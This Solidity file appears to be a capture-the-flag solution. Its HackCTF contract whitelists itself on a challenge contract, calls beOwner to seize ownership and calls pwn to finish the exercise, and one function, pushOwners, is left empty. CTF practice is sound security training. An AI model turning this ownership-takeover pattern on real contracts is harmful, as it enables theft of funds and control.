// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "./CTF.sol";

interface IBlocked {
    function addToWhitelist(address addr, string memory _name) external;

    function beOwner(address addr) external;

    function pwn(address addr) external payable;

    function pwn() external payable;

    function ownersName() external;
}

contract HackCTF {
    constructor(address _ctf) {
        IBlocked ctf = IBlocked(_ctf);
        ctf.addToWhitelist(address(this), "Pelz");
    }

    function beOwner(address _ctf) external {
        IBlocked ctf = IBlocked(_ctf);
        ctf.beOwner(address(this));
    }

    function pwn(address _ctf) external payable {
        IBlocked ctf = IBlocked(_ctf);
        ctf.pwn(address(this));
    }

    function _pwn(address _ctf) external payable {
        IBlocked ctf = IBlocked(_ctf);
        ctf.pwn();
    }

    function pushOwners(string memory _name, address _ctf) external {
        IBlocked ctf = IBlocked(_ctf);
    }
}
